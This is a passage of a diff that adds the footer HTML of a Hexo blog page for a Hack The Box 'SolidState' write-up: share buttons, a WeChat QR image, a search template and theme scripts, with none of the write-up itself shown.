+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SolidState - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtUlEQVR42u3aS44bMQwFQN//0skB4s97pGQ4QPVq4LG7WVqIapKPR3z9+ed6/81XnyT/ffWs989dXXh4eHjr0F/d+lVwrx6c/CpfsmQhntwHDw8P7xrv/RY/26ATQB5oEgMeHh7e7/OSbb3d7vffxMPDw/u/eO839HxR3t8ZDw8P7xd4eQk1SQN5KXZzpD5ca8HDw8OLefnx93f+vtLfw8PDw1t31WdJYtPuStpvRbR4eHh4F3izI3JeLEgCnSWkPE48PDy8b/JmbafZpp8XiOtiLh4eHt413maENGlxJd+8kjbw8PDwLvM27asWtk8G0VPw8PDwrvHql/xRp2k/erXq3eHh4eEd4rW3ztPDbEE3o1fFkAEeHh7eiDfbxNsCxCy1tEvz4V0BDw8P7xDv/UZ/trmVp4H9onzo7+Hh4eEteO3hdTZAMDzRl6WQJ5/g4eHhfYWXlB7aY3R7LM6TxIeY8fDw8L7Imw1dbRJGO24Vtcfw8PDwrvGSbbfYjsvGWN7iauPEw8PDu83LQ8+37zwN7EevntwNDw8P7xqvDaIdEcgLHLNiBB4eHt73ebMmU55O2mLEpgT8mGUzPDw8vDLC4vU+Pi63B+LZc6Pf4uHh4V3jrcabyjJuO6aQP/dw9sPDw8MLTp5tcWHWBmvPvbPlw8PDw7vHy8cCksZVXoo9O+w1HL3Cw8PDW/DaY25+CJ4tR3KHqASMh4eHd433WF9tMXfTcitacXh4eHhHebMRq3YIoK2p7ttyeHh4ePd4m3yyeXBe6q0bXfuchoeHhzc6Cs8wbTl4NhZQF03w8PDwrvHyg++ptHExj+Hh4eH9GC8P5VThoC2F4OHh4f0mLy8obJasHdg6lhjw8PDwynnOpM2fB7dpp+Wl3g+JAQ8PD+8or32jnw1OtUNXx0LHw8PDO8n7CxJgNcqkQRP3AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
